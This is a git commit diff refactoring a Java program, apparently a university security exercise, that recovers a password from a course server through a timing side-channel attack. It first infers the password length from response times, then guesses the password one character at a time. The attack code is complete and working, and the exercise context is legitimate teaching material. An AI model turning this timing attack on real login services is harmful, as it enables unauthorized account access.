af5da79bce829072cfe6c42f942e5b9c2e9811ef
lidorco <lidorco@outlook.com>
2020-04-19 16:42:54 +0300

    Organize the code

--- src/ex01_M1.java
+++ src/ex01_M1.java
@@ -3,21 +3,36 @@ import java.io.InputStream;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
+import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
+
+import static java.lang.System.exit;
 
 
 public class ex01_M1 {
 
+    // Const
+    public static int NANOSECONDS_IN_MILLISECONDS = 1000000;
+
+    // Configuration
     public static int MIN_PASSWORD_LENGTH = 1;
     public static int MAX_PASSWORD_LENGTH = 16;
-    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 30;
-    public static int FOUND_THE_PASSWORD = -1;
-    public static int ERROR_WHILE_CHECK_TIME = 0;
-    public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 30;
+    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 1;
+    public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 1;
+    public static int DEBUG_MESSAGE_COUNT = 1;
+    public static boolean DEBUG_MESSAGE = true;
+    public static int DIFFICULTY = 1;
+    public static String QUERY_ID = "ID";
+
+    // Flags
+    public static long FOUND_THE_PASSWORD = -1;
+    public static long ERROR_WHILE_CHECK_TIME = 0;
+
 
     /*
-     Returns the current value of the most precise available system timer, in nanoseconds.
+     Returns the current value of the most precise available system timer, in nanoseconds(10^-9 seconds).
      */
     public static long getCurrentTime() {
         return System.nanoTime();
@@ -45,117 +60,146 @@ public class ex01_M1 {
             }
 
         } catch (MalformedURLException e) {
-            System.out.println("Invalid URL Format");
+            System.out.println("Invalid URL Format:");
+            System.out.println(url);
             return ERROR_WHILE_CHECK_TIME;
         } catch (IOException e) {
-            System.out.println("Failed connect to the URL server");
+            System.out.println("Failed connect to the URL server:");
+            System.out.println(url);
             return ERROR_WHILE_CHECK_TIME;
         }
+
         return end - start;
     }
 
-    public static int checkPasswordLength(String url) {
-        Map<Integer, Long> passwordLengthToSumTime =  new HashMap<Integer, Long>();
-        Map<Integer, Integer> passwordLengthAttempts =  new HashMap<Integer, Integer>();
-        Map<Integer, String> passwordStrings =  new HashMap<Integer, String>();
-        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
-        {
-            passwordLengthToSumTime.put(i, (long) 0);
-            passwordLengthAttempts.put(i, 0);
-            passwordStrings.put(i, String.format(url, new String(new char[i]).replace("\0", "a")));
-        }
+    public static String buildUrlFromPassword(String password)
+    {
+        return String.format("http://aoi.ise.bgu.ac.il/?user=%s&password=%s&difficulty=%d", QUERY_ID, password, DIFFICULTY);
+    }
 
+    public static class PossiblePasswordData{
+        Integer passwordAttempts;
+        Long passwordSumTime;
+        Integer passwordErrors;
+
+        public PossiblePasswordData()
+        {
+            passwordAttempts = 0;
+            passwordSumTime = 0L;
+            passwordErrors = 0;
+        }
+    }
+
+    public static Map<String, PossiblePasswordData> executeTimingAttack(List<String> passwordsToCheck, int numberOfAttempts, Boolean debug)
+    {
+        Map<String, PossiblePasswordData> result = new HashMap<String, PossiblePasswordData>();
         long responseTime;
 
-        for (int i = 0; i < CHECK_PASSWORD_LENGTH_ATTEMPTS; i++)
+        for (String password : passwordsToCheck) {
+            result.put(password, new PossiblePasswordData());
+        }
+
+        // first call to do some setup in java:
+        checkResponseTime(buildUrlFromPassword("123"));
+
+        for (int i = 0; i < numberOfAttempts; i++)
         {
-            if (i % (CHECK_PASSWORD_LENGTH_ATTEMPTS / 10) == 0)
+            if (debug && (i % (CHECK_PASSWORD_LENGTH_ATTEMPTS / DEBUG_MESSAGE_COUNT) == 0))
             {
                 System.out.println(String.format("checked %d", i));
             }
-            for (int passwordLength = MIN_PASSWORD_LENGTH ; passwordLength <= MAX_PASSWORD_LENGTH ; passwordLength++)
-            {
-                responseTime = checkResponseTime(passwordStrings.get(passwordLength));
-                if (responseTime != ERROR_WHILE_CHECK_TIME && responseTime != FOUND_THE_PASSWORD)
+
+            for (String password : passwordsToCheck) {
+                responseTime = checkResponseTime(buildUrlFromPassword(password));
+
+                if (responseTime == FOUND_THE_PASSWORD)
                 {
-                    passwordLengthToSumTime.put(passwordLength, responseTime + passwordLengthToSumTime.get(passwordLength));
-                    passwordLengthAttempts.put(passwordLength, passwordLengthAttempts.get(passwordLength) + 1);
+                    System.out.println(String.format("Found the password! The *REAL* password is %s", password));
+                    exit(0);
                 }
+                else if(responseTime == ERROR_WHILE_CHECK_TIME)
+                {
+                    result.get(password).passwordErrors += 1;
+                }
+                else
+                {
+                    result.get(password).passwordAttempts += 1;
+                    result.get(password).passwordSumTime += responseTime;
+                }
+
             }
         }
 
-        int maxAveragePasswordLength = MIN_PASSWORD_LENGTH;
-        long maxAverage = passwordLengthToSumTime.get(MIN_PASSWORD_LENGTH) / passwordLengthAttempts.get(MIN_PASSWORD_LENGTH);
-        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++) {
-            long currentAverage = passwordLengthToSumTime.get(i) / passwordLengthAttempts.get(i);
-            System.out.println(String.format("Length %d took %d", i, currentAverage));
+        return result;
+    }
+
+    public static int checkPasswordLength() {
+        List<String> possiblePasswords = new ArrayList<String>();
+
+        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
+        {
+            possiblePasswords.add(new String(new char[i]).replace("\0", "a"));
+        }
+
+        Map<String, PossiblePasswordData> results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_LENGTH_ATTEMPTS, DEBUG_MESSAGE);
+
+        String maxAveragePassword = possiblePasswords.get(0);
+        double maxAverage = results.get(maxAveragePassword).passwordSumTime / results.get(maxAveragePassword).passwordAttempts;
+
+        for (String password: possiblePasswords) {
+            double currentAverage = results.get(password).passwordSumTime / results.get(password).passwordAttempts;
+
+            if(DEBUG_MESSAGE) {
+                System.out.println(String.format("Length %d took %f milliseconds", password.length(), currentAverage / NANOSECONDS_IN_MILLISECONDS));
+            }
             if (currentAverage > maxAverage)
             {
-                maxAveragePasswordLength = i;
+                maxAveragePassword = password;
                 maxAverage = currentAverage;
             }
         }
 
-        return maxAveragePasswordLength;
+        return maxAveragePassword.length();
     }
 
-    public static String checkThePassword(String url, int passwordLength)
+    public static String checkThePassword(int passwordLength)
     {
-        long responseTime;
         char[] availablePasswordChar = new char[]{'0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g',
                 'h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
                 'H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
 
         String charactersFoundFromPassword = "";
-        for (int currentPasswordIndex = 0; currentPasswordIndex < passwordLength; currentPasswordIndex++) {
-            Map<Character, Long> passwordToSumTime =  new HashMap<Character, Long>();
-            Map<Character, Integer> passwordAttempts =  new HashMap<Character, Integer>();
-            Map<Character, String> passwordStrings =  new HashMap<Character, String>();
-
+        for (int currentPasswordIndex = 0; currentPasswordIndex < passwordLength; currentPasswordIndex++)
+        {
+            List<String> possiblePasswords = new ArrayList<String>();
             for (char someChar: availablePasswordChar)
             {
-                passwordToSumTime.put(someChar, (long) 0);
-                passwordAttempts.put(someChar, 0);
                 String password = String.format("%s%c%s", charactersFoundFromPassword, someChar,
                         new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", "a"));
-                passwordStrings.put(someChar, String.format(url, password));
+
+                possiblePasswords.add(password);
             }
 
-            for (int i = 0; i < CHECK_PASSWORD_CHARS_ATTEMPTS; i++)
-            {
-                if (i % (CHECK_PASSWORD_CHARS_ATTEMPTS / 10) == 0)
-                {
-                    System.out.println(String.format("checked %d", i));
-                }
-                for (char someChar: availablePasswordChar)
-                {
-                    responseTime = checkResponseTime(passwordStrings.get(someChar));
-                    if (responseTime != ERROR_WHILE_CHECK_TIME && responseTime != FOUND_THE_PASSWORD)
-                    {
-                        passwordToSumTime.put(someChar, responseTime + passwordToSumTime.get(someChar));
-                        passwordAttempts.put(someChar, passwordAttempts.get(someChar) + 1);
-                    }
-                    else if (responseTime == FOUND_THE_PASSWORD)
-                    {
-                        return passwordStrings.get(someChar);
-                    }
-                }
-            }
+            Map<String, PossiblePasswordData> results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_CHARS_ATTEMPTS, DEBUG_MESSAGE);
 
-            char maxAveragePasswordChar = availablePasswordChar[0];
-            long maxAverage = passwordToSumTime.get(availablePasswordChar[0]) / passwordAttempts.get(availablePasswordChar[0]);
-            for (char someChar: availablePasswordChar)
+            String maxAveragePasswordChar = possiblePasswords.get(0);
+            double maxAverage = results.get(maxAveragePasswordChar).passwordSumTime / results.get(maxAveragePasswordChar).passwordAttempts;
+            for (String password: possiblePasswords)
             {
-                long currentAverage = passwordToSumTime.get(someChar) / passwordAttempts.get(someChar);
-                System.out.println(String.format("char %c took %d", someChar, currentAverage));
+                double currentAverage = results.get(password).passwordSumTime / results.get(password).passwordAttempts;
+
+                if(DEBUG_MESSAGE)
+                {
+                    System.out.println(String.format("char %c took %f milliseconds", password.charAt(currentPasswordIndex), currentAverage / NANOSECONDS_IN_MILLISECONDS));
+                }
                 if (currentAverage > maxAverage)
                 {
-                    maxAveragePasswordChar = someChar;
+                    maxAveragePasswordChar = password;
                     maxAverage = currentAverage;
                 }
-            }
 
-            charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, maxAveragePasswordChar);
+            }
+            charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, maxAveragePasswordChar.charAt(currentPasswordIndex));
             System.out.println(String.format("Password until now is %s", charactersFoundFromPassword));
         }
 
@@ -163,29 +207,13 @@ public class ex01_M1 {
     }
 
     public static void main(String[] args) {
-        if(args.length != 1) {
-            System.out.println("Missing URL argument");
-            System.exit(0);
-        }
+        int passwordLength = checkPasswordLength();
+        System.out.println(String.format("Password length is %d", passwordLength));
 
-        // first call to do some setup in java:
-        checkResponseTime("http://aoi.ise.bgu.ac.il/?user=ID&password=1234&difficulty=1");
+        String password = checkThePassword(passwordLength);
+        System.out.println(String.format("The password is %s", password));
 
-        long responseTime = 0;
-        int passwordLength;
-        String urlWithPassword = "";
-        while(responseTime != FOUND_THE_PASSWORD)
-        {
-            passwordLength = checkPasswordLength("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1");
-            System.out.println(String.format("Password length is %d", passwordLength));
-
-            urlWithPassword = checkThePassword("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1", passwordLength);
-            System.out.println(String.format("The password is %s", urlWithPassword));
-
-            responseTime = checkResponseTime(urlWithPassword);
-        }
-
-        System.out.println(String.format("The REAL password is %s", urlWithPassword));
-        System.out.println(String.format("The REAL password is %s", urlWithPassword));
+        long responseTime = checkResponseTime(buildUrlFromPassword(password));
+        System.out.println(String.format("The REAL password is %s", password));
     }
 }
